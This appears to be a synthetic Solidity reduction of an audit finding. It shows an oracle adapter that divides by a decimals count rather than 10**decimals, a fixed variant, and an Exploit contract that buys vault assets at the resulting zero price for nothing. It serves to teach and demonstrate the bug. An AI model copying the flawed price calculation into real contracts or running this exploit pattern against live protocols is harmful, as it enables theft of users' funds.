// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  StakedCapAdapter — decimal count is passed where 10**decimals belongs
    (Trail of Bits, finding #61540)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: price() calls convertToAssets(decimals()) and divides by that
    same count. With 1000 shares and 10 assets the 18-wei sample rounds to
    0, so the adapter reports price 0 instead of 1e6. */

interface IOracle {
    function getPrice(address asset) external view returns (uint256 latestAnswer, uint256 lastUpdated);
}

contract ERC20Min {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;
    uint8 public decimals;

    constructor(uint8 decimals_) {
        decimals = decimals_;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract StakedVault is ERC20Min {
    ERC20Min public underlying;
    uint256 public totalAssets;
    uint256 public paid;
    uint256 public assetsOut;

    constructor(ERC20Min underlying_) ERC20Min(18) {
        underlying = underlying_;
        totalAssets = 10 ether;
        underlying_.mint(address(this), 10 ether);
        totalSupply = 1000 ether;
        balanceOf[address(this)] = 1000 ether;
    }

    function asset() external view returns (address) {
        return address(underlying);
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        return shares * totalAssets / totalSupply;
    }

    function buy(address buyer, uint256 px) external returns (uint256 outAssets) {
        uint256 shares = balanceOf[address(this)];
        uint256 cost = shares * px / 1e8;
        paid = cost;
        outAssets = convertToAssets(shares);
        balanceOf[address(this)] -= shares;
        balanceOf[buyer] += shares;
        underlying.transfer(buyer, outAssets);
        assetsOut = outAssets;
    }
}

contract StakedCapAdapter {
    function price(address asset_) external view returns (uint256 latestAnswer, uint256 lastUpdated) {
        address capToken = StakedVault(asset_).asset();
        (latestAnswer, lastUpdated) = IOracle(msg.sender).getPrice(capToken);
        uint256 capTokenDecimals = ERC20Min(capToken).decimals(); // @> VULN: 18, not 10**18
        // FIX: capTokenDecimals = 10 ** ERC20Min(capToken).decimals()
        uint256 pricePerFullShare = StakedVault(asset_).convertToAssets(capTokenDecimals);
        latestAnswer = latestAnswer * pricePerFullShare / capTokenDecimals;
    }

    function priceFixed(address asset_) external view returns (uint256 latestAnswer) {
        uint256 scale = 10 ** uint256(ERC20Min(StakedVault(asset_).asset()).decimals());
        uint256 pricePerFullShare = StakedVault(asset_).convertToAssets(scale);
        latestAnswer = 1e8 * pricePerFullShare / scale;
    }
}

contract PriceOracle is IOracle {
    StakedCapAdapter public adapter;

    constructor(StakedCapAdapter adapter_) {
        adapter = adapter_;
    }

    function read(address asset_) external view returns (uint256 latestAnswer, uint256 lastUpdated) {
        return adapter.price(asset_);
    }

    function getPrice(address) external pure returns (uint256, uint256) {
        return (1e8, 1);
    }
}

contract Exploit {
    ERC20Min public underlying;
    StakedVault public vault;
    StakedCapAdapter public adapter;
    PriceOracle public oracle;
    uint256 public wrongPrice;
    uint256 public rightPrice;
    uint256 public assetsOut;
    uint256 public paid;

    constructor() {
        underlying = new ERC20Min(18);
        vault = new StakedVault(underlying);
        adapter = new StakedCapAdapter();
        oracle = new PriceOracle(adapter);
    }

    function run() external {
        address attacker = msg.sender;
        (wrongPrice,) = oracle.read(address(vault));
        rightPrice = adapter.priceFixed(address(vault));
        assetsOut = vault.buy(attacker, wrongPrice);
        paid = vault.paid();
        require(wrongPrice == 0, "zero price");
        require(rightPrice == 1_000_000, "fair price");
        require(paid == 0, "paid nothing");
        require(assetsOut == 10 ether, "redeemed");
        require(underlying.balanceOf(attacker) == 10 ether, "underlying");
    }
}
